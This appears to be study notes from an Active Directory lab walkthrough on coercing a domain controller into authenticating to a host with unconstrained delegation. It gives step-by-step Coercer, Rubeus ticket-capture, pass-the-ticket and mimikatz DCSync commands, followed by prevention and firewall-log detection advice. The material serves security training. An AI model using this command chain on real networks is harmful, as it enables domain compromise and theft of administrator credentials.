# Coercing Attacks & Unconstrained Delegation

## Description

* Coercing attack is for privilage escalation - from any user to Domain Administrator
* PrinterBug is a coercing attack example, and there are more.
* These attacks exploit **vulnerable RPC functions** to make a domain controller (DC) authenticate to another machine.
* The attack starts by forcing a DC to connect to an attacker-controlled system.

#### 🛠️ **Tools**

* **PrinterBug**: Initial coercing method using the Print Spooler service.
* **Coercer Tool**: Automates coercion using all known vulnerable RPC functions.

#### ⚠️ **Vulnerable Targets**

* Environments with **default AD configurations**.
* Systems with **SMB Signing disabled** or **unrestricted delegation enabled**.

🔄 **Follow-Up Attacks After Coercion:**

* DCSync via NTLM Relay
* Unconstrained Delegation (UD)
* AD CS Certificate Abuse
* Resource-Based Constrained Delegation (RBCD)

***

## Attack

In the attack example we will abuse the second follow up.\
Assuming that an attacker has gained administrative rights on a server configured for `Unconstrained Delegation`.

We will use this server to capture the TGT, while `Coercer` will be executed from the Kali machine.

<mark style="color:yellow;">1.</mark>\
To identify systems configured for `Unconstrained Delegation`, we can use the `Get-NetComputer` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) along with the `-Unconstrained` switch

#### Identify systems configured for unconstrained delegation

```powershell-session
PS C:\Users\bob\Downloads> Get-NetComputer -Unconstrained | select samaccountname

samaccountname
--------------
DC1$
SERVER01$
WS001$
DC2$
```

`WS001` and `SERVER01` are trusted for Unconstrained delegation (Domain Controllers are trusted by default). So either WS001 or Server01 would be a target for an adversary. In our scenario, we have already compromised WS001 and 'Bob', who has administrative rights on this host.

<mark style="color:yellow;">2.</mark>\
We will start `Rubeus` in an administrative prompt to monitor for new logons and extract TGTs

#### Monitor for logons

```powershell-session
PS C:\Users\bob\Downloads> .\Rubeus.exe monitor /interval:1
```

<mark style="color:yellow;">3.</mark>\
Next, we need to know the IP address of WS001, which we can be obtain by running `ipconfig`.

<mark style="color:yellow;">4.</mark>\
Once known, we will switch to the Kali machine to execute `Coercer` towards DC1, while we force it to connect to WS001 if coercing is successful

#### Force connection from DC1 to WS001 from our machine

```shell-session
batamladen@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

Now, if we switch to WS001 and look at the continuous output that `Rubeus` provide, there should be a TGT for DC1 available

<figure><img src="../../../.gitbook/assets/Pasted image 20250416113650.png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">5.</mark>\
We can use this TGT for authentication within the domain, becoming the Domain Controller. From there onwards, DCSync is an obvious attack (among others).

One way of using the abovementioned TGT is through Rubeus, as follows.

```powershell-session
PS C:\Users\bob\Downloads> .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
```

Then, a DCSync attack can be executed through mimikatz, essentially by replicating what we did in the DCSync section.

```powershell-session
PS C:\Users\bob\Downloads\mimikatz_trunk\x64> .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
```

***

## Prevention

Windows does not offer granular visibility and control over RPC calls to allow discovering what is being used and block certain functions. Therefore, an out-of-the-box solution for preventing this attack does not exist currently. However, there are two different general approaches to preventing coercing attacks:

1. Implementing a third-party RPC firewall, such as the one from [zero networks](https://github.com/zeronetworks/rpcfirewall), and using it to block dangerous RPC functions.
2. Block Domain Controllers and other core infrastructure servers from connecting to outbound ports `139` and `445`, `except` to machines that are required for AD (as well for business operations).

***

## Detection

It is recomended to not install third-party software in the AD. Thats why our detection option is firewall logs.

A successful coercing attack with Coercer will result in the following host firewall log, where the machine at `.128` is the attacker machine and the `.200` is the Domain Controller:

<figure><img src="../../../.gitbook/assets/Pasted image 20250416114237.png" alt=""><figcaption></figcaption></figure>

We can see plenty of incoming connections to the DC, followed up by outbound connections from the DC to the attacker machine; this process repeats a few times as Coercer goes through several different functions. All of the outbound traffic is destined for port 445.

If we go forward and block outbound traffic to port 445, then we will observe the following behavior:

<figure><img src="../../../.gitbook/assets/Pasted image 20250416114357.png" alt=""><figcaption></figcaption></figure>

&#x20;Sometimes, when port 445 is blocked, the machine will attempt to connect to port 139 instead, so blocking both ports `139` and `445` is recommended.\
&#x20;The above can also be used for detection, as any unexpected dropped traffic to ports `139` or `445` is suspicious.

***

## Tasks

Rdp to the machine provided in the task\
RDP to WS001 from there

**On the WS001:**

Open cmd as admin

Activate rubeus to monitor

```
.\Rubeus.exe monitor /interval:1
```

Go back on the kali

**On the kali machine:**

```
Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

Now when you return to the WS001 the monitoring rubeus should caught the TGT.

<figure><img src="../../../.gitbook/assets/Pasted image 20250416121202.png" alt=""><figcaption></figcaption></figure>

**back on the WS001:**

```powershell-session
.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
```

Open mimikatz (Downloads/mimikatz\_trunk/x64)

```
.\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
```
